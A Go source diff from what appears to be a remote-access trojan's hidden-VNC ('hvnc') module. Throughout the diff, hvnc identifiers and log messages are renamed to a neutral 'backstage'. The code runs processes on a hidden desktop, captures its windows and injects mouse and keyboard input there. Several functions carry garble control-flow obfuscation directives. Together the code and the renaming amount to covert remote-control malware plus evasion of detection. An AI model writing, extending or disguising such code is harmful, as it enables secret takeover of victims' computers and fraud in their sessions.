-		log.Printf("hvnc capture: requested display %d out of range (0-%d), defaulting to 0", display, maxDisplays-1)
+		log.Printf("backstage capture: requested display %d out of range (0-%d), defaulting to 0", display, maxDisplays-1)
 		display = 0
 	}
 
-	bounds, boundsSource := hvncResolveCaptureBounds(display)
+	bounds, boundsSource := backstageResolveCaptureBounds(display)
 	srcW := bounds.Dx()
 	srcH := bounds.Dy()
 	if srcW <= 0 || srcH <= 0 {
-		log.Printf("hvnc capture: invalid bounds for display=%d source=%s bounds=%v", display, boundsSource, bounds)
+		log.Printf("backstage capture: invalid bounds for display=%d source=%s bounds=%v", display, boundsSource, bounds)
 		return nil, syscall.EINVAL
 	}
 
 	userScale := effectiveScale(srcW, srcH)
-	hvncLastScale.Store(math.Float64bits(userScale))
+	backstageLastScale.Store(math.Float64bits(userScale))
 	dstW := int(float64(srcW) * userScale)
 	dstH := int(float64(srcH) * userScale)
 	if dstW <= 0 || dstH <= 0 {
@@ -892,7 +892,7 @@ func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 	capW := srcW
 	capH := srcH
 
-	hdcScreen, hdcMem, buf, ok := hvncEnsureCapCache(capW, capH)
+	hdcScreen, hdcMem, buf, ok := backstageEnsureCapCache(capW, capH)
 	if !ok {
 		return nil, syscall.EINVAL
 	}
@@ -901,21 +901,21 @@ func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 		buf[i] = 0
 	}
 
-	drawn := drawHVNCWindowsToBuffer(hdcScreen, bounds, buf, capW*4)
+	drawn := drawbackstageWindowsToBuffer(hdcScreen, bounds, buf, capW*4)
 	if drawn == 0 {
 		now := time.Now().UnixNano()
-		last := hvncNoWindowLogNs.Load()
-		if now-last > int64(5*time.Second) && hvncNoWindowLogNs.CompareAndSwap(last, now) {
-			log.Printf("hvnc capture: no windows drawn for display=%d source=%s bounds=%v", display, boundsSource, bounds)
+		last := backstageNoWindowLogNs.Load()
+		if now-last > int64(5*time.Second) && backstageNoWindowLogNs.CompareAndSwap(last, now) {
+			log.Printf("backstage capture: no windows drawn for display=%d source=%s bounds=%v", display, boundsSource, bounds)
 		}
 	}
 
 	swapRB(buf)
 
-	img := hvncCapImg
+	img := backstageCapImg
 	if img == nil || img.Bounds().Dx() != capW || img.Bounds().Dy() != capH {
 		img = image.NewRGBA(image.Rect(0, 0, capW, capH))
-		hvncCapImg = img
+		backstageCapImg = img
 	}
 	copy(img.Pix, buf)
 
@@ -928,12 +928,12 @@ func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 	return img, nil
 }
 
-func startHVNCProcessOnThread(filePath string, display int) (uint32, error) {
+func startbackstageProcessOnThread(filePath string, display int) (uint32, error) {
 	if filePath == "" {
 		return 0, fmt.Errorf("empty file path")
 	}
 
-	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
+	desktopNamePtr, err := syscall.UTF16PtrFromString(backstageDesktopName)
 	if err != nil {
 		return 0, fmt.Errorf("failed to convert desktop name: %v", err)
 	}
@@ -975,23 +975,23 @@ func startHVNCProcessOnThread(filePath string, display int) (uint32, error) {
 	return pi.dwProcessId, nil
 }
 
-func hvncAutoStartExplorerOnThread() error {
-	if hvncExplorerStarted {
+func backstageAutoStartExplorerOnThread() error {
+	if backstageExplorerStarted {
 		return nil
 	}
 
 	if isExplorerRunningToolhelp() {
-		log.Printf("hvnc: explorer.exe already running on HVNC desktop, skipping auto-start")
-		hvncExplorerStarted = true
+		log.Printf("backstage: explorer.exe already running on backstage desktop, skipping auto-start")
+		backstageExplorerStarted = true
 		return nil
 	}
 
-	log.Printf("hvnc: no explorer.exe found on HVNC desktop, starting explorer.exe")
-	_, err := startHVNCProcessOnThread("explorer.exe", 0)
+	log.Printf("backstage: no explorer.exe found on backstage desktop, starting explorer.exe")
+	_, err := startbackstageProcessOnThread("explorer.exe", 0)
 	if err != nil {
 		return fmt.Errorf("auto-start explorer failed: %w", err)
 	}
-	hvncExplorerStarted = true
+	backstageExplorerStarted = true
 	return nil
 }
 
@@ -1052,18 +1052,18 @@ func isExplorerRunningToolhelp() bool {
 	return false
 }
 
-func hvncMouseMoveOnThread(display int, x, y int32) error {
+func backstageMouseMoveOnThread(display int, x, y int32) error {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
-	bounds, _ := hvncResolveCaptureBounds(display)
+	bounds, _ := backstageResolveCaptureBounds(display)
 	if bounds.Dx() <= 0 || bounds.Dy() <= 0 {
-		hvncInputMu.Lock()
-		hvncLastCursor = point{x: x, y: y}
-		hvncHasCursor = true
-		hvncInputMu.Unlock()
+		backstageInputMu.Lock()
+		backstageLastCursor = point{x: x, y: y}
+		backstageHasCursor = true
+		backstageInputMu.Unlock()
 		return nil
 	}
 
-	if bits := hvncLastScale.Load(); bits != 0 {
+	if bits := backstageLastScale.Load(); bits != 0 {
 		if s := math.Float64frombits(bits); s > 0 && s < 1 {
 			x = int32(float64(x) / s)
 			y = int32(float64(y) / s)
@@ -1085,11 +1085,11 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 		absY = bounds.Max.Y - 1
 	}
 
-	hvncInputMu.Lock()
-	hvncLastCursor = point{x: int32(absX), y: int32(absY)}
-	hvncHasCursor = true
-	hvncInputMu.Unlock()
-	moveHVNCWindowIfDragging(point{x: int32(absX), y: int32(absY)})
+	backstageInputMu.Lock()
+	backstageLastCursor = point{x: int32(absX), y: int32(absY)}
+	backstageHasCursor = true
+	backstageInputMu.Unlock()
+	movebackstageWindowIfDragging(point{x: int32(absX), y: int32(absY)})
 
 	pt := point{x: int32(absX), y: int32(absY)}
 	hitHwnd := windowFromPoint(pt)
@@ -1104,7 +1104,7 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 			procSetFocus.Call(hitHwnd)
 		}
 
-		if hvncUIAEnabled.Load() && isWinUI3Window(hitHwnd) {
+		if backstageUIAEnabled.Load() && isWinUI3Window(hitHwnd) {
 			uiaHandleDragMove(pt)
 			uiaHandleMouseMove(hitHwnd, pt)
 			return nil
@@ -1117,12 +1117,12 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 	return nil
 }
 
-func hvncMouseButtonOnThread(button int, down bool) error {
+func backstageMouseButtonOnThread(button int, down bool) error {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
-	pt := currentHVNCCursor()
+	pt := currentbackstageCursor()
 
 	if button == 0 && !down {
-		endHVNCWindowDrag(pt)
+		endbackstageWindowDrag(pt)
 	}
 
 	setMouseButton(button, down)
@@ -1134,7 +1134,7 @@ func hvncMouseButtonOnThread(button int, down bool) error {
 
 	// UIA branch: keep message-style clicks as the primary signal, but let
 	// UIA resolve complicated targets such as WinUI3/Explorer elements.
-	if hvncUIAEnabled.Load() {
+	if backstageUIAEnabled.Load() {
 		return uiaHandleMouseButton(hitHwnd, pt, button, down)
 	}
 
@@ -1164,12 +1164,12 @@ func hvncMouseButtonOnThread(button int, down bool) error {
 				if down {
 					var r rect
 					if ok, _, _ := procGetWindowRect.Call(hitHwnd, uintptr(unsafe.Pointer(&r))); ok != 0 {
-						hvncInputMu.Lock()
-						hvncMovingWindow = true
-						hvncWindowToMove = hitHwnd
-						hvncMoveOffset = point{x: pt.x - r.left, y: pt.y - r.top}
-						hvncWindowSize = point{x: r.right - r.left, y: r.bottom - r.top}
-						hvncInputMu.Unlock()
+						backstageInputMu.Lock()
+						backstageMovingWindow = true
+						backstageWindowToMove = hitHwnd
+						backstageMoveOffset = point{x: pt.x - r.left, y: pt.y - r.top}
+						backstageWindowSize = point{x: r.right - r.left, y: r.bottom - r.top}
+						backstageInputMu.Unlock()
 					}
 				}
 				return nil
@@ -1229,9 +1229,9 @@ func hvncMouseButtonOnThread(button int, down bool) error {
 	return nil
 }
 
-func hvncKeyOnThread(vk uint16, down bool) error {
+func backstageKeyOnThread(vk uint16, down bool) error {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
-	pt := currentHVNCCursor()
+	pt := currentbackstageCursor()
 	hwnd := windowFromPoint(pt)
 	if hwnd == 0 {
 		hwnd = foregroundWindow()
@@ -1256,7 +1256,7 @@ func hvncKeyOnThread(vk uint16, down bool) error {
 	}
 	updateModifierState(vk, down)
 
-	if hvncUIAEnabled.Load() && isWinUI3Window(hwnd) {
+	if backstageUIAEnabled.Load() && isWinUI3Window(hwnd) {
 		if isModifierVK(vk) {
 			return nil
 		}
@@ -1344,27 +1344,27 @@ func rememberWorkingWindow(hwnd uintptr) {
 	if hwnd == 0 {
 		return
 	}
-	hvncInputMu.Lock()
-	hvncWorkingWindow = hwnd
-	hvncInputMu.Unlock()
+	backstageInputMu.Lock()
+	backstageWorkingWindow = hwnd
+	backstageInputMu.Unlock()
 }
 
 func getWorkingWindow() uintptr {
-	hvncInputMu.Lock()
-	defer hvncInputMu.Unlock()
-	return hvncWorkingWindow
+	backstageInputMu.Lock()
+	defer backstageInputMu.Unlock()
+	return backstageWorkingWindow
 }
 
-func currentHVNCCursor() point {
-	hvncInputMu.Lock()
-	if hvncHasCursor {
-		pt := hvncLastCursor
-		hvncInputMu.Unlock()
+func currentbackstageCursor() point {
+	backstageInputMu.Lock()
+	if backstageHasCursor {
+		pt := backstageLastCursor
+		backstageInputMu.Unlock()
 		return pt
 	}
-	hvncInputMu.Unlock()
+	backstageInputMu.Unlock()
 	var pt point
-	procGetCursorPosHVNC.Call(uintptr(unsafe.Pointer(&pt)))
+	procGetCursorPosbackstage.Call(uintptr(unsafe.Pointer(&pt)))
 	return pt
 }
 
@@ -1373,16 +1373,16 @@ func postMouseMessage(hwnd uintptr, msg uint32, wparam uintptr, pt point) {
 }
 
 func setPendingActivation(hwnd uintptr) {
-	hvncInputMu.Lock()
-	hvncPendingActivate = hwnd
-	hvncInputMu.Unlock()
+	backstageInputMu.Lock()
+	backstagePendingActivate = hwnd
+	backstageInputMu.Unlock()
 }
 
 func consumePendingActivation() uintptr {
-	hvncInputMu.Lock()
-	defer hvncInputMu.Unlock()
-	hwnd := hvncPendingActivate
-	hvncPendingActivate = 0
+	backstageInputMu.Lock()
+	defer backstageInputMu.Unlock()
+	hwnd := backstagePendingActivate
+	backstagePendingActivate = 0
 	return hwnd
 }
 
@@ -1397,8 +1397,8 @@ func postKeyMessage(hwnd uintptr, msg uint32, vk uint16) {
 }
 
 func setMouseButton(button int, down bool) uint32 {
-	hvncInputMu.Lock()
-	defer hvncInputMu.Unlock()
+	backstageInputMu.Lock()
+	defer backstageInputMu.Unlock()
 	var mask uint32
 	switch button {
 	case 0:
@@ -1408,20 +1408,20 @@ func setMouseButton(button int, down bool) uint32 {
 	case 2:
 		mask = MK_RBUTTON
 	default:
-		return hvncMouseButtons
+		return backstageMouseButtons
 	}
 	if down {
-		hvncMouseButtons |= mask
+		backstageMouseButtons |= mask
 	} else {
-		hvncMouseButtons &^= mask
+		backstageMouseButtons &^= mask
 	}
-	return hvncMouseButtons
+	return backstageMouseButtons
 }
 
 func currentMouseButtons() uint32 {
-	hvncInputMu.Lock()
-	defer hvncInputMu.Unlock()
-	return hvncMouseButtons
+	backstageInputMu.Lock()
+	defer backstageInputMu.Unlock()
+	return backstageMouseButtons
 }
 
 func mapVirtualKey(vk uint32) uintptr {
@@ -1487,13 +1487,13 @@ func safeNCHitTest(hwnd uintptr, lparam uintptr) int32 {
 	return int32(result)
 }
 
-func moveHVNCWindowIfDragging(screenPt point) {
-	hvncInputMu.Lock()
-	moving := hvncMovingWindow
-	hwnd := hvncWindowToMove
-	offset := hvncMoveOffset
-	size := hvncWindowSize
-	hvncInputMu.Unlock()
+func movebackstageWindowIfDragging(screenPt point) {
+	backstageInputMu.Lock()
+	moving := backstageMovingWindow
+	hwnd := backstageWindowToMove
+	offset := backstageMoveOffset
+	size := backstageWindowSize
+	backstageInputMu.Unlock()
 	if !moving || hwnd == 0 {
 		return
 	}
@@ -1502,15 +1502,15 @@ func moveHVNCWindowIfDragging(screenPt point) {
 	procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(size.x), uintptr(size.y), 0)
 }
 
-func endHVNCWindowDrag(screenPt point) {
-	hvncInputMu.Lock()
-	moving := hvncMovingWindow
-	hwnd := hvncWindowToMove
-	offset := hvncMoveOffset
-	size := hvncWindowSize
-	hvncMovingWindow = false
-	hvncWindowToMove = 0
-	hvncInputMu.Unlock()
+func endbackstageWindowDrag(screenPt point) {
+	backstageInputMu.Lock()
+	moving := backstageMovingWindow
+	hwnd := backstageWindowToMove
+	offset := backstageMoveOffset
+	size := backstageWindowSize
+	backstageMovingWindow = false
+	backstageWindowToMove = 0
+	backstageInputMu.Unlock()
 	if !moving || hwnd == 0 {
 		return
 	}
@@ -1519,8 +1519,8 @@ func endHVNCWindowDrag(screenPt point) {
 	procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(size.x), uintptr(size.y), 0)
 }
 
-func hvncMouseWheelOnThread(delta int32) error {
-	pt := currentHVNCCursor()
+func backstageMouseWheelOnThread(delta int32) error {
+	pt := currentbackstageCursor()
 	hwnd := windowFromPoint(pt)
 	if hwnd == 0 {
 		hwnd = getWorkingWindow()
@@ -1529,7 +1529,7 @@ func hvncMouseWheelOnThread(delta int32) error {
 		}
 	}
 
-	if hvncUIAEnabled.Load() && isWinUI3Window(hwnd) {
+	if backstageUIAEnabled.Load() && isWinUI3Window(hwnd) {
 		return uiaHandleMouseWheel(hwnd, pt, delta)
 	}
 
@@ -1570,30 +1570,30 @@ func isModifierVK(vk uint16) bool {
 }
 
 func updateModifierState(vk uint16, down bool) {
-	hvncInputMu.Lock()
-	defer hvncInputMu.Unlock()
+	backstageInputMu.Lock()
+	defer backstageInputMu.Unlock()
 	switch vk {
 	case VK_SHIFT, VK_LSHIFT, VK_RSHIFT:
-		hvncShiftDown = down
+		backstageShiftDown = down
 	case VK_CONTROL, VK_LCONTROL, VK_RCONTROL:
-		hvncCtrlDown = down
+		backstageCtrlDown = down
 	case VK_MENU, VK_LMENU, VK_RMENU:
-		hvncAltDown = down
+		backstageAltDown = down
 	case VK_CAPITAL:
 		if down {
-			hvncCapsLock = !hvncCapsLock
+			backstageCapsLock = !backstageCapsLock
 		}
 	}
 }
 
 func buildKeyboardState() []byte {
 	state := make([]byte, 256)
-	hvncInputMu.Lock()
-	shift := hvncShiftDown
-	ctrl := hvncCtrlDown
-	alt := hvncAltDown
-	caps := hvncCapsLock
-	hvncInputMu.Unlock()
+	backstageInputMu.Lock()
+	shift := backstageShiftDown
+	ctrl := backstageCtrlDown
+	alt := backstageAltDown
+	caps := backstageCapsLock
+	backstageInputMu.Unlock()
 	if shift {
 		state[VK_SHIFT] = 0x80
 	}
@@ -1609,11 +1609,11 @@ func buildKeyboardState() []byte {
 	return state
 }
 
-func HVNCMonitorCount() int {
+func BackstageMonitorCount() int {
 	return displayCount()
 }
 
-func hvncResolveCaptureBounds(display int) (image.Rectangle, string) {
+func backstageResolveCaptureBounds(display int) (image.Rectangle, string) {
 	mons := monitorList()
 	if display >= 0 && display < len(mons) {
 		mon := mons[display]
@@ -1622,7 +1622,7 @@ func hvncResolveCaptureBounds(display int) (image.Rectangle, string) {
 			return bounds, fmt.Sprintf("monitor=%d name=%q", display, mon.name)
 		}
 	}
-	if desktopBounds, ok := hvncDesktopBounds(); ok {
+	if desktopBounds, ok := backstageDesktopBounds(); ok {
 		return desktopBounds, "desktop"
 	}
 	vx := int(getSystemMetric(SM_XVIRTUALSCREEN))
@@ -1635,7 +1635,7 @@ func hvncResolveCaptureBounds(display int) (image.Rectangle, string) {
 	return image.Rectangle{}, "unknown"
 }
 
-func drawHVNCWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target []byte, targetStride int) int {
+func drawbackstageWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target []byte, targetStride int) int {
 	hwnd := getTopWindow(0)
 	if hwnd == 0 {
 		return 0
@@ -1646,8 +1646,8 @@ func drawHVNCWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target [
 	}
 
 	// Initialize cache if needed
-	if hvncWinCache == nil {
-		hvncWinCache = make(map[uintptr]*hvncWinCacheEntry)
+	if backstageWinCache == nil {
+		backstageWinCache = make(map[uintptr]*backstageWinCacheEntry)
 	}
 
 	// Track which windows are still alive this frame
@@ -1655,7 +1655,7 @@ func drawHVNCWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target [
 
 	drawn := 0
 	for hwnd != 0 {
-		if drawHVNCWindow(hdcScreen, hwnd, bounds, target, targetStride) {
+		if drawbackstageWindow(hdcScreen, hwnd, bounds, target, targetStride) {
 			drawn++
 		}
 		alive[hwnd] = true
@@ -1663,24 +1663,24 @@ func drawHVNCWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target [
 	}
 
 	// Evict cache entries for windows that no longer exist
-	for h, entry := range hvncWinCache {
+	for h, entry := range backstageWinCache {
 		if !alive[h] {
-			hvncFreeCacheEntry(entry)
-			delete(hvncWinCache, h)
+			backstageFreeCacheEntry(entry)
+			delete(backstageWinCache, h)
 		}
 	}
 
 	return drawn
 }
 
-func hvncGetOrCreateCache(hdcScreen uintptr, hwnd uintptr, w, h int) *hvncWinCacheEntry {
-	entry, ok := hvncWinCache[hwnd]
+func backstageGetOrCreateCache(hdcScreen uintptr, hwnd uintptr, w, h int) *backstageWinCacheEntry {
+	entry, ok := backstageWinCache[hwnd]
 	if ok && entry.w == w && entry.h == h && entry.hdcMem != 0 && entry.hbmp != 0 {
 		entry.age = 0
 		return entry
 	}
 	if ok {
-		hvncFreeCacheEntry(entry)
+		backstageFreeCacheEntry(entry)
 	}
 	hdcMem := createCompatibleDC(hdcScreen)
 	if hdcMem == 0 {
@@ -1704,18 +1704,18 @@ func hvncGetOrCreateCache(hdcScreen uintptr, hwnd uintptr, w, h int) *hvncWinCac
 	}
 	selectObject(hdcMem, hbmp)
 
-	entry = &hvncWinCacheEntry{
+	entry = &backstageWinCacheEntry{
 		hdcMem: hdcMem,
 		hbmp:   hbmp,
 		bits:   bits,
 		w:      w,
 		h:      h,
 	}
-	hvncWinCache[hwnd] = entry
+	backstageWinCache[hwnd] = entry
 	return entry
 }
 
-func hvncFreeCacheEntry(entry *hvncWinCacheEntry) {
+func backstageFreeCacheEntry(entry *backstageWinCacheEntry) {
 	if entry.hbmp != 0 {
 		deleteObject(entry.hbmp)
 	}
@@ -1726,32 +1726,32 @@ func hvncFreeCacheEntry(entry *hvncWinCacheEntry) {
 
 var dxgiFrameBuf []byte
 
-var hvncDXGIEnabled atomic.Bool
-var hvncUIAEnabled atomic.Bool
+var backstageDXGIEnabled atomic.Bool
+var backstageUIAEnabled atomic.Bool
 
 func init() {
-	hvncDXGIEnabled.Store(false) // disabled by default
-	hvncUIAEnabled.Store(false)  // disabled by default
+	backstageDXGIEnabled.Store(false) // disabled by default
+	backstageUIAEnabled.Store(false)  // disabled by default
 }
 
-func SetHVNCDXGIEnabled(enabled bool) {
-	hvncDXGIEnabled.Store(enabled)
+func SetbackstageDXGIEnabled(enabled bool) {
+	backstageDXGIEnabled.Store(enabled)
 }
 
-func GetHVNCDXGIEnabled() bool {
-	return hvncDXGIEnabled.Load()
+func GetbackstageDXGIEnabled() bool {
+	return backstageDXGIEnabled.Load()
 }
 
-func SetHVNCUIAEnabled(enabled bool) {
-	hvncUIAEnabled.Store(enabled)
+func SetbackstageUIAEnabled(enabled bool) {
+	backstageUIAEnabled.Store(enabled)
 }
 
-func GetHVNCUIAEnabled() bool {
-	return hvncUIAEnabled.Load()
+func GetbackstageUIAEnabled() bool {
+	return backstageUIAEnabled.Load()
 }
 
-func drawHVNCWindowFromDXGI(hwnd uintptr, winLeft, winTop, winW, winH int, bounds image.Rectangle, target []byte, targetStride int) bool {
-	if !hvncDXGIEnabled.Load() {
+func drawbackstageWindowFromDXGI(hwnd uintptr, winLeft, winTop, winW, winH int, bounds image.Rectangle, target []byte, targetStride int) bool {
+	if !backstageDXGIEnabled.Load() {
 		return false
 	}
 	var pid uint32
@@ -1760,13 +1760,13 @@ func drawHVNCWindowFromDXGI(hwnd uintptr, winLeft, winTop, winW, winH int, bound
 		return false
 	}
 
-	reader := hvncGetFrameReader(pid)
+	reader := backstageGetFrameReader(pid)
 	if reader == nil {
-		hvncFrameReadersMu.Lock()
-		gpuPID := hvncGPUPIDMap[pid]
-		hvncFrameReadersMu.Unlock()
+		backstageFrameReadersMu.Lock()
+		gpuPID := backstageGPUPIDMap[pid]
+		backstageFrameReadersMu.Unlock()
 		if gpuPID != 0 {
-			reader = hvncGetFrameReader(gpuPID)
+			reader = backstageGetFrameReader(gpuPID)
 		}
 	}
 	if reader == nil {
@@ -1823,7 +1823,7 @@ func drawHVNCWindowFromDXGI(hwnd uintptr, winLeft, winTop, winW, winH int, bound
 	return true
 }
 
-func drawHVNCWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []byte, targetStride int) bool {
+func drawbackstageWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []byte, targetStride int) bool {
 	if !isWindowVisible(hwnd) {
 		return false
 	}
@@ -1849,12 +1849,12 @@ func drawHVNCWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []by
 		return false
 	}
 
-	if drawn := drawHVNCWindowFromDXGI(hwnd, winLeft, winTop, winW, winH, bounds, target, targetStride); drawn {
+	if drawn := drawbackstageWindowFromDXGI(hwnd, winLeft, winTop, winW, winH, bounds, target, targetStride); drawn {
 		return true
 	}
 
 	// Use pooled DC+DIB from cache
-	entry := hvncGetOrCreateCache(hdcScreen, hwnd, winW, winH)
+	entry := backstageGetOrCreateCache(hdcScreen, hwnd, winW, winH)
 	if entry == nil {
 		return false
 	}
@@ -1984,7 +1984,7 @@ var (
 	procGetWindowTextLenW = user32.NewProc("GetWindowTextLengthW")
 )
 
-type HVNCWindowInfo struct {
+type BackstageWindowInfo struct {
 	HWND        uintptr
 	Title       string
 	X           int
@@ -1997,18 +1997,18 @@ type HVNCWindowInfo struct {
 	Visible     bool
 }
 
-func HVNCEnumWindows() ([]HVNCWindowInfo, []HVNCMonitorInfo) {
-	hvncDesktopMu.Lock()
-	deskHandle := hvncDesktopHandle
-	hvncDesktopMu.Unlock()
+func BackstageEnumWindows() ([]BackstageWindowInfo, []BackstageMonitorInfo) {
+	backstageDesktopMu.Lock()
+	deskHandle := backstageDesktopHandle
+	backstageDesktopMu.Unlock()
 	if deskHandle == 0 {
 		return nil, nil
 	}
 
 	mons := monitorList()
-	monInfos := make([]HVNCMonitorInfo, len(mons))
+	monInfos := make([]BackstageMonitorInfo, len(mons))
 	for i, m := range mons {
-		monInfos[i] = HVNCMonitorInfo{
+		monInfos[i] = BackstageMonitorInfo{
 			Index:   i,
 			Name:    m.name,
 			X:       m.rect.Min.X,
@@ -2030,7 +2030,7 @@ func HVNCEnumWindows() ([]HVNCWindowInfo, []HVNCMonitorInfo) {
 	})
 	procEnumDesktopWindows.Call(deskHandle, cb, 0)
 
-	var result []HVNCWindowInfo
+	var result []BackstageWindowInfo
 	for _, w := range windows {
 		if !isWindowVisible(w.hwnd) {
 			continue
@@ -2077,7 +2077,7 @@ func HVNCEnumWindows() ([]HVNCWindowInfo, []HVNCMonitorInfo) {
 			}
 		}
 
-		result = append(result, HVNCWindowInfo{
+		result = append(result, BackstageWindowInfo{
 			HWND:        w.hwnd,
 			Title:       title,
 			X:           winLeft,
@@ -2093,7 +2093,7 @@ func HVNCEnumWindows() ([]HVNCWindowInfo, []HVNCMonitorInfo) {
 	return result, monInfos
 }
 
-type HVNCMonitorInfo struct {
+type BackstageMonitorInfo struct {
 	Index   int
 	Name    string
 	X       int
